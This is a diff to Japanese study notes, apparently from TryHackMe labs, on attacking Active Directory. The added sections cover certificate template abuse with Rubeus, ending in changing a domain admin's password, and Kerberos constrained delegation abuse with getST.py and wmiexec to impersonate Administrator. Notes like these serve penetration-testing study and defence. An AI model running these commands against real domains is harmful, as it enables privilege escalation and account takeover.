@@ -119,7 +119,7 @@ hashcat -m 18200 hash.txt Pass.txt
 impacket はユーザーリストを与える必要はあるが、リモートで実行できる。
 
 ```sh
-python3 /home/kali/tools/impacket/examples/GetNPUsers.py -dc-ip $TARGET controller.local/ -usersfile users.txt
+GetNPUsers.py -dc-ip $TARGET controller.local/ -usersfile users.txt
 ```
 
 ## Pass the ticket
@@ -200,4 +200,99 @@ misc::skeleton
 net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
 
 dir \\Desktop-1\c$ /user:Machine1 mimikatz
+```
+
+## 証明書テンプレート
+
+https://tryhackme.com/room/adcertificatetemplates
+
+```ps
+# 全てのテンプレートを列挙
+certutil -v -template > cert_templates.txt
+```
+
+### 必要条件
+
+#### 1. テンプレートの権限
+
+`Allow Enroll` or `Allow Full Control`
+
+「Allow Enroll」 キーワードを grep し、返されたグループの中にユーザーが所属するグループがないかを確認する。
+
+#### 2. クライアント証明 EKU
+
+証明書が Kerberos 認証に使用できる。  
+`Client Authentication` という単語で grep する。
+
+#### 3. サブジェクト別名（SAN）を指定可能
+
+SAN を制御できる場合は、証明書を利用して任意の AD アカウント用の Kerberos チケットを実際に生成できる。  
+`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` プロパティが 1 に設定されていること。
+
+### 証明書生成（GUI）
+
+1. `mmc（Microsoft管理コンソール）` を起動
+2. File - スナップインの追加と削除
+3. Certificates スナップインを追加
+4. メインコンソール画面に戻り、Certificates を展開、Personal を右クリック
+5. All Tasks - Request New Certificate
+6. Next を 2 回
+7. `「この証明書を登録するには、さらに情報が必要です。」`リンクをクリック
+8. Type を `Common Name` に変更。値は任意。
+9. 代替名の Type を`User Principle Name`に変更。値は、偽装するアカウントの UPN。
+10. 上下の Add を押下。
+11. OK を押すとリンククリック前の画面に戻り、登録可能になっている。
+12. チェックして Enroll
+13. メインコンソールで Personal の下の証明書を右クリック
+14. All Tasks - Export
+15. 道なりに進むが、PrivateKey は必ずエクスポートする。
+16. 形式は PFX、パスワードは設定する。
+
+### なりすまし
+
+#### TGT 取得
+
+```ps
+# 形式
+Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:lunar.eruca.com /dc:<IP of domain controller>
+
+# 例
+.\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.69.219
+```
+
+例
+
+```ps
+# TGTを使ってパスワード変更
+.\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
+
+# runas
+runas /user:lunar.eruca.com\<username of DA> cmd.exe
+```
+
+## Kerberos Constrained Delegation (S4U) Abuse
+
+https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html#impacket--linux-tooling-altservice--full-s4u
+
+bloodhound上で、DARLA_WINTERS ユーザー が HAYSTACK.THM.CORP コンピュータアカウントに対して AllowedToDelegate を持つと表示されている状態。
+
+THM.CORP, HAYSTACK.THM.CORP は、/etc/hosts に設定しておく必要がある。
+
+```sh
+$ getST.py -k -impersonate Administrator -spn cifs/HAYSTACK.THM.CORP THM.CORP/DARLA_WINTERS
+
+$ ls -al Admini*       
+-rw-rw-r-- 1 kali kali 1657 Feb 25 11:36 Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
+
+$ export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
+
+$ wmiexec.py THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
+```
+
+背後の意味
+
+```sh
+１．Administrator が DARLA_WINTERS にアクセスする形のチケットを（DARLA_WINTERS が）要求
+２．DARLA_WINTERS が Administrator の代理として cifs/HAYSTACK にアクセスすることを要求（そのときに1のチケットを提示する）
+３．Administrator が HAYSTACK の CIFS にアクセスするための正式なチケット（TGS）が発行される
 ```
